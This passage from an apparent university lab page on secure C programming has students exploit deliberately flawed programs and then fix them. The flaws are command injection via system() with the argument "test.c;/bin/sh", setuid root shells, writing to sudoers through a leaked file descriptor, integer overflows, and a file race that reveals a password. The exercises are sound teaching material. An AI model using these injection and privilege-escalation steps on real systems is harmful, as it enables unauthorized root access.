<strong><code class="docutils literal notranslate"><span class="pre">gcc</span> <span class="pre">-o</span> <span class="pre">test</span> <span class="pre">test.c</span></code></strong></p><p>Observe the behaviour of the program with</p>
<p class="centered">
<strong><code class="docutils literal notranslate"><span class="pre">./test</span> <span class="pre">test.c</span></code></strong></p><div class="line-block">
<div class="line">See that test prints the contents of a file, here <code class="docutils literal notranslate"><span class="pre">test.c</span></code> as
specified by the first argument. Also see that this is achieved using
<code class="docutils literal notranslate"><span class="pre">cat</span></code> and <code class="docutils literal notranslate"><span class="pre">system(...)</span></code>.</div>
</div>
<div class="line-block">
<div class="line">Now let’s create a shell command with test</div>
</div>
<p class="centered">
<strong><code class="docutils literal notranslate"><span class="pre">./test</span> <span class="pre">&quot;test.c;/bin/sh&quot;</span></code></strong></p><p>Observe that the command prompt has changed (we’re in a new <code class="docutils literal notranslate"><span class="pre">/bin/sh</span></code>
shell). Inside this shell run the command</p>
<p class="centered">
<strong><code class="docutils literal notranslate"><span class="pre">whoami</span></code></strong></p><div class="line-block">
<div class="line">We’re still ”admin” since we were user when we ran the original
command. Interesting, but not useful… yet. Let’s ”exit” here to get
back to where we came from.</div>
</div>
<div class="line-block">
<div class="line">Recall (from the setup) that “admin” has <code class="docutils literal notranslate"><span class="pre">sudo</span></code> and <strong>does not need
password</strong>, let’s exploit this!</div>
</div>
<p class="centered">
<strong><code class="docutils literal notranslate"><span class="pre">sudo</span> <span class="pre">./test</span> <span class="pre">&quot;test.c;/bin/sh&quot;</span></code></strong></p><p class="centered">
<strong><code class="docutils literal notranslate"><span class="pre">whoami</span></code></strong></p><div class="line-block">
<div class="line">Now we’ve gained root access and a root shell. We had sudo already so
this is not a big concern, but illustrates the mechanics of how to
spawn a potentially vulnerable shell. Let’s return back from our shell
again with “exit”.</div>
</div>
<div class="collapse tp2_s1" id="tp2_1_1"><a class="sol-img reference internal image-reference" href="../_images/1.1.PNG"><img alt="../_images/1.1.PNG" class="sol-img align-center" src="../_images/1.1.PNG" style="width: 498.59999999999997px; height: 404.4px;" /></a>
</div><div class="line-block">
<div class="line">Let’s make a copy of our test program called retest, make it owned by
root, and have the <code class="docutils literal notranslate"><span class="pre">SETUID</span></code> flag set.</div>
</div>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">cp</span> <span class="pre">test</span> <span class="pre">retest</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">sudo</span> <span class="pre">chown</span> <span class="pre">root:root</span> <span class="pre">retest</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">sudo</span> <span class="pre">chmod</span> <span class="pre">4755</span> <span class="pre">retest</span></code></li>
</ul>
<p>Now we can see the differences between <code class="docutils literal notranslate"><span class="pre">test</span></code> and <code class="docutils literal notranslate"><span class="pre">retest</span></code> with</p>
<p class="centered">
<strong><code class="docutils literal notranslate"><span class="pre">ls</span> <span class="pre">-al</span></code></strong></p><div class="collapse tp2_s1" id="tp2_1_2"><a class="sol-img reference internal image-reference" href="../_images/1.2.PNG"><img alt="../_images/1.2.PNG" class="sol-img align-center" src="../_images/1.2.PNG" style="width: 432.0px; height: 321.59999999999997px;" /></a>
</div><div class="line-block">
<div class="line">Observe that retest has ”s” instead of ”x” for the first execution
property and is owned by ”root root”.</div>
</div>
<div class="line-block">
<div class="line">Now we can run the same basic command as before to see that retest
behaves the same:</div>
</div>
<p class="centered">
<strong><code class="docutils literal notranslate"><span class="pre">./retest</span> <span class="pre">test.c</span></code></strong></p><p>Now let’s recreate a shell command with <code class="docutils literal notranslate"><span class="pre">retest</span></code></p>
<p class="centered">
<strong><code class="docutils literal notranslate"><span class="pre">./retest</span> <span class="pre">&quot;test.c;/bin/sh&quot;</span></code></strong></p><p class="centered">
<strong><code class="docutils literal notranslate"><span class="pre">whoami</span></code></strong></p><div class="collapse tp2_s1" id="tp2_1_3"><a class="sol-img reference internal image-reference" href="../_images/1.3.PNG"><img alt="../_images/1.3.PNG" class="sol-img align-center" src="../_images/1.3.PNG" style="width: 430.8px; height: 204.6px;" /></a>
</div><div class="line-block">
<div class="line">We are still admin… (but this may be useful later).</div>
</div>
<?php
      if($good) {
         //nothing
      } else {
         echo '<script type="text/javascript">',
                  'updateSol("tp2_1_1 tp2_1_2 tp2_1_3",".tp2_s1","using-system-setuid-from-lecture");',
                  //'getSolution("../_images/1.PNG","using-system-setuid-from-lecture");',
                  //'getSolution("../_images/2.PNG","using-system-setuid-from-lecture");',
                  //'getSolution("../_images/3.PNG","using-system-setuid-from-lecture");',
               '</script>';
         include "../_static/solution.html";
      }
?></div>
<div class="section" id="spam-delay">
<h3>Spam &amp; Delay<a class="headerlink" href="#spam-delay" title="Permalink to this headline">¶</a></h3>
<div class="line-block">
<div class="line">The <code class="docutils literal notranslate"><span class="pre">test.c</span></code> program emulates the behaviour of the linux ”cat”
command in a naive way. Let’s look at two more simple programs to do
trivial tasks, but that may have vulnerabilities in how they achieve
their goals.</div>
</div>
<div class="line-block">
<div class="line">The <code class="docutils literal notranslate"><span class="pre">spam.c</span></code> code takes two arguments, the first a number and the
second a string. This program then spams the string the number of
times specified.</div>
</div>
<div class="line-block">
<div class="line">Again we can compile this with</div>
</div>
<p class="centered">
<strong><code class="docutils literal notranslate"><span class="pre">gcc</span> <span class="pre">-o</span> <span class="pre">spam</span> <span class="pre">spam.c</span></code></strong></p><p>And observe the behaviour with</p>
<p class="centered">
<strong><code class="docutils literal notranslate"><span class="pre">./spam</span> <span class="pre">5</span> <span class="pre">SPAM</span></code></strong></p><p>Let’s look at the code for spam.c</p>
<p class="centered">
<strong><code class="docutils literal notranslate"><span class="pre">cat</span> <span class="pre">spam.c</span></code></strong></p><p>❓ <strong>Can you find a way to exploit this code to open a shell? How might you
fix the code to prevent this vulnerability?</strong></p>
<div class="admonition hint">
<p class="first admonition-title">Hint</p>
<p class="last"><strong>💡 Is using</strong> <code class="docutils literal notranslate"><span class="pre">system()</span></code> <strong>and</strong> <code class="docutils literal notranslate"><span class="pre">echo</span></code> <strong>the best way to print a
string?</strong></p>
</div>
<div class="collapse tp2_s2" id="tp2_2_1">
   <div class="panel panel-primary">
     <div class="panel-heading"><b>Possible solution</b></div>
     <div class="panel-body">You could use <code class="docutils literal"><span class="pre">printf()</span></code> (in a good way)</div>
   </div><a class="sol-img reference internal image-reference" href="../_images/51.PNG"><img alt="../_images/51.PNG" class="sol-img align-center" src="../_images/51.PNG" style="width: 226.2px; height: 48.6px;" /></a>
</div><div class="line-block">
<div class="line">The second example is a simple program (<code class="docutils literal notranslate"><span class="pre">delay.c</span></code>) to delay for a
number of seconds (like the ”sleep” command). But it seems the
developer may have made a poor choice in implementation.</div>
</div>
<div class="line-block">
<div class="line">❓ <strong>Can you create the same exploit here to gain a shell? How might you
fix the code to prevent this vulnerability?</strong></div>
</div>
<div class="admonition hint">
<p class="first admonition-title">Hint</p>
<p class="last"><strong>💡 Should we pass a string through? Should we use</strong> <code class="docutils literal notranslate"><span class="pre">system()</span></code> <strong>?</strong></p>
</div>
<div class="collapse tp2_s2" id="tp2_2_2">
   <div class="panel panel-primary">
     <div class="panel-heading"><b>Possible solution</b></div>
     <div class="panel-body">Instead of using <code class="docutils literal"><span class="pre">system()</span></code>
     , we could cast the parameter into integer and directly use the  C'<code class="docutils literal"><span class="pre">sleep()</span></code> function</div>
   </div><a class="sol-img reference internal image-reference" href="../_images/72.PNG"><img alt="../_images/72.PNG" class="sol-img align-center" src="../_images/72.PNG" style="width: 193.2px; height: 45.6px;" /></a>
</div><?php
      if($good) {
         //nothing
      } else {
         echo '<script type="text/javascript">',
                  'updateSol("tp2_2_1 tp2_2_2",".tp2_s2","spam-delay");',
                  //'getSolution("../_images/51.PNG","spam-delay");',
                  //'getSolution("../_images/71.PNG","spam-delay");',
               '</script>';
         include "../_static/solution.html";
      }
?></div>
<div class="section" id="execve-exploit">
<h3><code class="docutils literal notranslate"><span class="pre">execve</span></code> exploit<a class="headerlink" href="#execve-exploit" title="Permalink to this headline">¶</a></h3>
<div class="line-block">
<div class="line">Now let’s look at direct file descriptor manipulation (based on
<code class="docutils literal notranslate"><span class="pre">leakage.c</span></code> from the lectures).</div>
</div>
<p>Examine the code of <code class="docutils literal notranslate"><span class="pre">fedit.c</span></code> which takes a file as an argument and
allows you to execute a shell with access to that file’s file
descriptor. We can build this with</p>
<p class="centered">
<strong><code class="docutils literal notranslate"><span class="pre">gcc</span> <span class="pre">-o</span> <span class="pre">fedit</span> <span class="pre">fedit.c</span></code></strong></p><p>and let’s make a version for use by root</p>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">sudo</span> <span class="pre">cp</span> <span class="pre">fedit</span> <span class="pre">rootedit</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">sudo</span> <span class="pre">chown</span> <span class="pre">root:root</span> <span class="pre">rootedit</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">sudo</span> <span class="pre">chmod</span> <span class="pre">4755</span> <span class="pre">rootedit</span></code></li>
</ul>
<p>And let’s also make a copy of <code class="docutils literal notranslate"><span class="pre">/etc/sudoers</span></code> that still belongs to
root</p>
<p class="centered">
<strong><code class="docutils literal notranslate"><span class="pre">sudo</span> <span class="pre">cp</span> <span class="pre">/etc/sudoers</span> <span class="pre">.</span></code></strong></p><p>Observe that sudoers is still not accessible to us</p>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">ls</span> <span class="pre">-lsa</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">touch</span> <span class="pre">sudoers</span></code></li>
</ul>
<div class="collapse tp2_s3" id="tp2_3_1"><a class="sol-img reference internal image-reference" href="../_images/82.PNG"><img alt="../_images/82.PNG" class="sol-img align-center" src="../_images/82.PNG" style="width: 529.8px; height: 219.0px;" /></a>
</div><div class="line-block">
<div class="line">But let’s try out rootedit</div>
</div>
<p class="centered">
<strong><code class="docutils literal notranslate"><span class="pre">./rootedit</span> <span class="pre">sudoers</span></code></strong></p><div class="collapse tp2_s3" id="tp2_3_2"><a class="sol-img reference internal image-reference" href="../_images/91.PNG"><img alt="../_images/91.PNG" class="sol-img align-center" src="../_images/91.PNG" style="width: 673.8px; height: 350.4px;" /></a>
</div><div class="line-block">
<div class="line">We will have the file descriptor ”fd” and then a shall. If we try to</div>
</div>
<p>touch sudoers in the shall we will fail</p>
<p class="centered">
<strong><code class="docutils literal notranslate"><span class="pre">touch</span> <span class="pre">sudoers</span></code></strong></p><div class="line-block">
<div class="line">this is because we are still ”user” as we can see with <code class="docutils literal notranslate"><span class="pre">whoami</span></code>.</div>
</div>
<div class="line-block">
<div class="line">But we can write to the file descriptor!</div>
</div>
<p class="centered">
<strong><code class="docutils literal notranslate"><span class="pre">echo</span> <span class="pre">&quot;#</span> <span class="pre">test&quot;</span> <span class="pre">&gt;&amp;3</span></code></strong></p><div class="collapse tp2_s3" id="tp2_3_3"><a class="sol-img reference internal image-reference" href="../_images/10.PNG"><img alt="../_images/10.PNG" class="sol-img align-center" src="../_images/10.PNG" style="width: 362.4px; height: 91.8px;" /></a>
</div><div class="line-block">
<div class="line">Now let’s exit and use sudo to check the contents of sudoers</div>
</div>
<p class="centered">
<strong><code class="docutils literal notranslate"><span class="pre">sudo</span> <span class="pre">cat</span> <span class="pre">sudoers</span></code></strong></p><p>We can see that we’ve written to the sudoers file without (in theory)
ever having permission to do so. (Don’t forget to exit the sh session
back to your normal environment here.)</p>
<div class="admonition danger alert alert-danger alert-error">
<p class="first admonition-title">BONUS:</p>
<p class="last">❓ <strong>Create a new account on your system that does not have</strong>
<code class="docutils literal notranslate"><span class="pre">sudo</span></code> <strong>access (no entry in</strong> <code class="docutils literal notranslate"><span class="pre">/etc/sudoers</span></code> <strong>). Use your rootedit as
this user to give yourself</strong> <code class="docutils literal notranslate"><span class="pre">sudo</span></code> <strong>privileges.</strong></p>
</div>
<div class="admonition warning">
<p class="first admonition-title">Warning</p>
<p class="last"><strong>Be careful here, you don’t want to accidentally break
your</strong> <code class="docutils literal notranslate"><span class="pre">/etc/sudoers</span></code> <strong>file!!</strong></p>
</div>
<?php
      if($good) {
         //nothing
      } else {
         echo '<script type="text/javascript">',
                  'updateSol("tp2_3_1 tp2_3_2 tp2_3_3",".tp2_s3","execve-exploit");',
                  //'getSolution("../_images/81.PNG","execve-exploit");',
                  //'getSolution("../_images/9.PNG","execve-exploit");',
                  //'getSolution("../_images/10.PNG","execve-exploit");',
               '</script>';
         include "../_static/solution.html";
      }
?></div>
<div class="section" id="integer-overflows">
<h3>Integer Overflows<a class="headerlink" href="#integer-overflows" title="Permalink to this headline">¶</a></h3>
<p>Let’s revisit signedness overflow from the lecture. Look at the code for <code class="docutils literal notranslate"><span class="pre">sign-overflow.c</span></code> let’s compile it and test</p>
<p class="centered">
<strong><code class="docutils literal notranslate"><span class="pre">gcc</span> <span class="pre">-o</span> <span class="pre">sign-overflow</span> <span class="pre">sign-overflow.c</span></code></strong></p><p>and run with some inputs (300, 1000, etc.)</p>
<div class="admonition hint">
<p class="first admonition-title">Hint</p>
<p class="last"><strong>💡 Try 10 000, is that what you expect ?</strong></p>
</div>
<div class="line-block">
<div class="line"><strong>Can you fix this?</strong></div>
</div>
<div class="collapse tp2_s4" id="tp2_4_3">
   <div class="panel panel-primary">
     <div class="panel-heading"><b>Possible solution</b></div>
     <div class="panel-body">We can simply use larger variable such as <code class="docutils literal"><span class="pre">int</span></code> instead of <code class="docutils literal"><span class="pre">short</span></code> for example</div>
   </div><a class="sol-img reference internal image-reference" href="../_images/signedoverflow.PNG"><img alt="../_images/signedoverflow.PNG" class="sol-img align-center" src="../_images/signedoverflow.PNG" style="width: 290.4px; height: 215.4px;" /></a>
</div><div class="line-block">
<div class="line">Now that we know about this, let’s look at <code class="docutils literal notranslate"><span class="pre">spam.c</span></code> again. <strong>Is
there somewhere here that might not behave as expected?</strong></div>
</div>
<div class="admonition hint">
<p class="first admonition-title">Hint</p>
<p><strong>💡 what happens if we run?</strong></p>
<ul class="last simple">
<li><code class="docutils literal notranslate"><span class="pre">gcc</span> <span class="pre">-o</span> <span class="pre">spam</span> <span class="pre">spam.c</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">./spam</span> <span class="pre">300</span> <span class="pre">&quot;Hello&quot;</span></code></li>
</ul>
</div>
<div class="admonition caution">
<p class="first admonition-title">Caution</p>
<p class="last"><strong>Here you may need to know about</strong> <code class="docutils literal notranslate"><span class="pre">Ctrl+Z</span></code> <strong>to get out of this!</strong></p>
</div>
<p>❓ <strong>Also if you use</strong> <code class="docutils literal notranslate"><span class="pre">Ctrl+Z</span></code> <strong>the process still exists, we can find it’s
process ID (pid) and kill it with:</strong></p>
<p class="centered">
<strong><code class="docutils literal notranslate"><span class="pre">top</span> <span class="pre">-b</span> <span class="pre">-n</span> <span class="pre">1</span> <span class="pre">|</span> <span class="pre">grep</span> <span class="pre">spam</span></code></strong></p><p>which will show the pid as the first number on the line</p>
<p class="centered">
<strong><code class="docutils literal notranslate"><span class="pre">kill</span> <span class="pre">-9</span> <span class="pre">&lt;pid&gt;</span></code></strong></p><div class="collapse tp2_s4" id="tp2_4_1"><a class="sol-img reference internal image-reference" href="../_images/11.PNG"><img alt="../_images/11.PNG" class="sol-img align-center" src="../_images/11.PNG" style="width: 537.6px; height: 73.2px;" /></a>
</div><div class="line-block">
<div class="line">❓ <strong>Can we fix this (in addition to fixing the previous
vulnerability)?</strong></div>
</div>
<div class="collapse tp2_s4" id="tp2_4_4">
   <div class="panel panel-primary">
     <div class="panel-heading"><b>Possible solution</b></div>
     <div class="panel-body">You could use <code class="docutils literal"><span class="pre">printf()</span></code> (in a good way)</div>
   </div><a class="sol-img reference internal image-reference" href="../_images/spam.PNG"><img alt="../_images/spam.PNG" class="sol-img align-center" src="../_images/spam.PNG" style="width: 333.59999999999997px; height: 40.199999999999996px;" /></a>
</div><div class="line-block">
<div class="line">Now let’s look at <code class="docutils literal notranslate"><span class="pre">mycat.c</span></code> which attempts to fix the bad behaviour
of <code class="docutils literal notranslate"><span class="pre">test.c</span></code>. Observe that for efficiency this code allows the user
to specify the ”buffer size” to read from the file. (Specifying the
buffer size is more common in network communication, but also appears
in Linux utilities like dd.) we can build this with</div>
</div>
<p class="centered">
<strong><code class="docutils literal notranslate"><span class="pre">gcc</span> <span class="pre">-o</span> <span class="pre">mycat</span> <span class="pre">mycat.c</span></code></strong></p><p class="centered">
<strong><code class="docutils literal notranslate"><span class="pre">./mycat</span> <span class="pre">mycat.c</span></code></strong></p><p>❓ <strong>Does this code behave properly without specifying a buffer size?</strong></p>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">./mycat</span> <span class="pre">shortfile</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">./mycat</span> <span class="pre">longfile</span></code></li>
</ul>
<div class="collapse tp2_s4" id="tp2_4_5"><a class="sol-img reference internal image-reference" href="../_images/shortlong.PNG"><img alt="../_images/shortlong.PNG" class="sol-img align-center" src="../_images/shortlong.PNG" style="width: 555.6px; height: 279.59999999999997px;" /></a>
</div><p>❓ <strong>What happens if the buffer size is specified?</strong></p>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">./mycat</span> <span class="pre">shortfile</span> <span class="pre">50</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">./mycat</span> <span class="pre">longfile</span> <span class="pre">50</span></code></li>
</ul>
<p>❓ <strong>Can we break this code and crash the program?</strong></p>
<div class="admonition hint">
<p class="first admonition-title">Hint</p>
<p class="last"><strong>💡 What happens if we specify a buffer size of 65536?</strong></p>
</div>
<div class="collapse tp2_s4" id="tp2_4_2"><a class="sol-img reference internal image-reference" href="../_images/shortlong2.PNG"><img alt="../_images/shortlong2.PNG" class="sol-img align-center" src="../_images/shortlong2.PNG" style="width: 352.2px; height: 99.0px;" /></a>
<br><a class="sol-img reference internal image-reference" href="../_images/shortlong3.PNG"><img alt="../_images/shortlong3.PNG" class="sol-img align-center" src="../_images/shortlong3.PNG" style="width: 357.59999999999997px; height: 69.0px;" /></a>
</div><p>❓ <strong>Can we fix this code and still allow the user to specify the buffer
size? What would be realistic buffer sizes to use on a modern system?
Should we change the buffer size (and allocation)?</strong></p>
<div class="collapse tp2_s4" id="tp2_4_6">
   <div class="panel panel-primary">
     <div class="panel-heading"><b>Possible solution</b></div>
     <div class="panel-body">
      <div class="highlight-c"><div class="highlight"><pre><span></span>
      //short s = 100; //max buffer size
      long  s = 1024;
      if(s>100) { printf("Buffer size too large\n"); return 1; }
      </pre></div>
      </div>
     </div>
   </div>
</div><div class="admonition hint">
<p class="first admonition-title">Hint</p>
<p class="last"><strong>💡 See bettercat.c for some possible solutions.</strong></p>
</div>
<div class="admonition danger alert alert-danger alert-error">
<p class="first admonition-title">BONUS</p>
<p class="last">❓ <strong>Find the error in</strong> <code class="docutils literal notranslate"><span class="pre">bettercat.c</span></code> <strong>and fix it.</strong></p>
</div>
<div class="collapse tp2_s4" id="tp2_4_7">
   <div class="panel panel-primary">
     <div class="panel-heading"><b>Possible solution</b></div>
     <div class="panel-body">We have a cast from <code class="docutils literal"><span class="pre">int</span></code> to <code class="docutils literal"><span class="pre">unsigned int</span></code></div>
   </div>
</div><?php
      if($good) {
         //nothing
      } else {
         echo '<script type="text/javascript">',
                  'updateSol("tp2_5_1 tp2_4_2 tp2_4_3 tp2_4_4 tp2_4_5 tp2_4_6 tp2_4_7",".tp2_s4","integer-overflows");',
                  //'getSolution("../_images/11.PNG","integer-overflows");',
                  //'getSolution("../_images/13.PNG","integer-overflows");',
               '</script>';
         include "../_static/solution.html";
      }
?></div>
<div class="section" id="race-conditions">
<h3>Race Conditions<a class="headerlink" href="#race-conditions" title="Permalink to this headline">¶</a></h3>
<p>Let us consider the code in race.c that creates a file and saves our
secret password into it. Clearly the code is intended to keep the
password secret only for us by setting the file to read/write/execute
only for us. Let’s build this file, give it to root, and setuid it.</p>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">gcc</span> <span class="pre">-o</span> <span class="pre">race</span> <span class="pre">race.c</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">sudo</span> <span class="pre">chown</span> <span class="pre">root:root</span> <span class="pre">race</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">sudo</span> <span class="pre">chmod</span> <span class="pre">4755</span> <span class="pre">race</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">./race</span></code></li>
</ul>
<p>a file <code class="docutils literal notranslate"><span class="pre">password.txt</span></code> has been created that we cannot read</p>
<p class="centered">
<strong><code class="docutils literal notranslate"><span class="pre">cat</span> <span class="pre">password.txt</span></code></strong></p><div class="collapse tp2_s5" id="tp2_5_1"><a class="sol-img reference internal image-reference" href="../_images/race.PNG"><img alt="../_images/race.PNG" class="sol-img align-center" src="../_images/race.PNG" style="width: 268.8px; height: 101.39999999999999px;" /></a>
</div><div class="line-block">
<div class="line">because we don’t heave permission.</div>
</div>
<div class="line-block">
<div class="line">However, if we examine the code of <code class="docutils literal notranslate"><span class="pre">race.c</span></code> we see that is a time after
the password is written and before the permissions are set. Let’s use
a race condition to quickly read the file.</div>
</div>
<div class="line-block">
<div class="line">To do this we use the <code class="docutils literal notranslate"><span class="pre">exploit.c</span></code> code that deletes the
<code class="docutils literal notranslate"><span class="pre">password.txt</span></code> file and then tries to read it (as many times as
specified) and output the contents.</div>
</div>
<p class="centered">
<strong><code class="docutils literal notranslate"><span class="pre">gcc</span> <span class="pre">-o</span> <span class="pre">exploit</span> <span class="pre">exploit.c</span></code></strong></p><p>Now we can try and use the exploit to obtain the contents of
<code class="docutils literal notranslate"><span class="pre">password.txt</span></code> before the permissions are fixed. We will need two
processes running at the same time to exploit the race condition, so in
one terminal run:</p>
<p class="centered">
<strong><code class="docutils literal notranslate"><span class="pre">while</span> <span class="pre">true;</span> <span class="pre">do</span> <span class="pre">./race;</span> <span class="pre">done</span></code></strong></p><div class="collapse tp2_s5" id="tp2_5_2"><a class="sol-img reference internal image-reference" href="../_images/race2.PNG"><img alt="../_images/race2.PNG" class="sol-img align-center" src="../_images/race2.PNG" style="width: 351.0px; height: 72.6px;" /></a>
</div><div class="line-block">
<div class="line">which will start to infinitely check/recreate the <code class="docutils literal notranslate"><span class="pre">password.txt</span></code> file.</div>
</div>
<div class="line-block">
<div class="line">In another terminal run</div>
</div>
<p class="centered">
<strong><code class="docutils literal notranslate"><span class="pre">./exploit</span> <span class="pre">1000</span> <span class="pre">&gt;&gt;result.txt</span></code></strong></p><div class="line-block">
<div class="line">that will try to delete and then read the <code class="docutils literal notranslate"><span class="pre">password.txt</span></code> file 1000
times.</div>
</div>
<div class="line-block">
<div class="line">If we’re lucky we should see the a mixture of ”permission denied” and
”no such file or directory” from our exploit. Then when it finishes we
can check the contents of <code class="docutils literal notranslate"><span class="pre">result.txt</span></code> and find that our password
has been revealed (probably a number of times).</div>
</div>
<div class="admonition note">
<p class="first admonition-title">Note</p>
<p class="last"><strong>If the result.txt is empty, try running exploit with a larger
argument.</strong></p>
</div>
<div class="collapse tp2_s5" id="tp2_5_3"><a class="sol-img reference internal image-reference" href="../_images/race3.PNG"><img alt="../_images/race3.PNG" class="sol-img align-center" src="../_images/race3.PNG" style="width: 286.8px; height: 139.79999999999998px;" /></a>
</div><p>❓ <strong>Can you fix race.c to not have this exploit?</strong></p>
<div class="collapse tp2_s5" id="tp2_5_4">
   <div class="panel panel-primary">
     <div class="panel-heading"><b>Possible solution</b></div>
     <div class="panel-body">(From: <a class="reference external" href="http://www.cis.syr.edu/~wedu/Teaching/IntrCompSec/LectureNotes_New/Race_Condition.pdf"> http://www.cis.syr.edu/~wedu/Teaching/IntrCompSec/LectureNotes_New/Race_Condition.pdf </a>)<br>
         As said in the paper, there are many improvement that can be done such as, replacing <code class="docutils literal"><span class="pre">stat</span></code> by <code class="docutils literal"><span class="pre">fstat</span></code>
         in order to check the file descriptor instead of the file itself directly. Also we could use exclusive mode "x" in <code class="docutils literal"><span class="pre">fopen</span></code>.
     </div>
   </div>
</div><?php
      if($good) {
         //nothing
      } else {
         echo '<script type="text/javascript">',
                  'updateSol("tp2_5_1 tp2_5_2 tp2_5_3 tp2_5_3",".tp2_s5","race-conditions");',
               '</script>';
         include "../_static/solution.html";
      }
?></div>
<div class="section" id="thread-race-conditions-from-lecture">
<h3>Thread Race Conditions (from lecture)<a class="headerlink" href="#thread-race-conditions-from-lecture" title="Permalink to this headline">¶</a></h3>
<p>Let us consider the code in <code class="docutils literal notranslate"><span class="pre">threadrace.c</span></code> that creates different
threads that share a common variable. The code is somewhat obfuscated to
hide what it does, but we should be able to see the behaviour described
in the lecture by using different compilation options.</p>
<p class="centered">
<strong><code class="docutils literal notranslate"><span class="pre">gcc</span> <span class="pre">-pthread</span> <span class="pre">-o</span> <span class="pre">threadrace</span> <span class="pre">threadrace.c</span></code></strong></p><p class="centered">
<strong><code class="docutils literal notranslate"><span class="pre">./threadrace</span></code></strong></p><div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;pthread.h&gt;</span><span class="cp"></span>

<span class="kt">void</span> <span class="o">*</span><span class="nf">f</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">v</span><span class="p">)</span> <span class="p">{</span>
  <span class="kt">int</span> <span class="o">*</span><span class="n">i</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span> <span class="n">v</span><span class="p">;</span>
  <span class="o">*</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;set to 0!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
  <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
  <span class="k">const</span> <span class="kt">int</span> <span class="n">c</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">pthread_t</span> <span class="kr">thread</span><span class="p">;</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">ptr</span> <span class="o">=</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">c</span><span class="p">;</span>
  <span class="k">while</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">i</span><span class="o">++</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">i</span> <span class="o">==</span> <span class="mi">1000</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="kr">thread</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">f</span><span class="p">,</span> <span class="n">ptr</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;done</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
</div>
<div class="line-block">
<div class="line">We expect to see the program terminate. If you run this code many
times you may even see different behaviours (but even a bad scheduler
will probably always let this program terminate).</div>
</div>
<div class="line-block">
<div class="line">However, we suspect (from the lecture since we trust Axel) that the
program can reach a non-termination state if the compiler optimised
too much.</div>
</div>
<div class="line-block">
<div class="line">Let’s try compiling with some different optimisation options. <code class="docutils literal notranslate"><span class="pre">gcc</span></code>
has many compilation optimisation options, try with:</div>
</div>
<table border="1" class="docutils">
<colgroup>
<col width="16%" />
<col width="16%" />
<col width="16%" />
<col width="16%" />
<col width="16%" />
<col width="21%" />
</colgroup>
<thead valign="bottom">
<tr class="row-odd"><th class="head" colspan="6">&#160;</th>
</tr>
</thead>
<tbody valign="top">
<tr class="row-even"><td><code class="docutils literal notranslate"><span class="pre">-00</span></code></td>
<td><code class="docutils literal notranslate"><span class="pre">-01</span></code></td>
<td><code class="docutils literal notranslate"><span class="pre">-02</span></code></td>
<td><code class="docutils literal notranslate"><span class="pre">-03</span></code></td>
<td><code class="docutils literal notranslate"><span class="pre">-0s</span></code></td>
<td><code class="docutils literal notranslate"><span class="pre">-0fast</span></code></td>
</tr>
</tbody>
</table>
<div class="line-block">
<div class="line">and see which of these cause non-termination. <strong>Are the results what
you expect?</strong></div>
</div>
<div class="collapse tp2_s6" id="tp2_6_1"><p class="centered">
<strong><code class="docutils literal notranslate"><span class="pre">gcc</span></code></strong></p><a class="sol-img reference internal image-reference" href="../_images/racec.PNG"><img alt="../_images/racec.PNG" class="sol-img align-center" src="../_images/racec.PNG" style="width: 286.2px; height: 145.2px;" /></a>
</div><div class="collapse tp2_s6" id="tp2_6_2"><p class="centered">
<strong><code class="docutils literal notranslate"><span class="pre">0race</span></code></strong></p><a class="sol-img reference internal image-reference" href="../_images/racec2.PNG"><img alt="../_images/racec2.PNG" class="sol-img align-center" src="../_images/racec2.PNG" style="width: 251.39999999999998px; height: 108.0px;" /></a>
</div><div class="collapse tp2_s6" id="tp2_6_3"><p class="centered">
<strong><code class="docutils literal notranslate"><span class="pre">1race</span></code></strong></p><a class="sol-img reference internal image-reference" href="../_images/racec3.PNG"><img alt="../_images/racec3.PNG" class="sol-img align-center" src="../_images/racec3.PNG" style="width: 269.4px; height: 122.39999999999999px;" /></a>
</div><div class="collapse tp2_s6" id="tp2_6_4"><p class="centered">
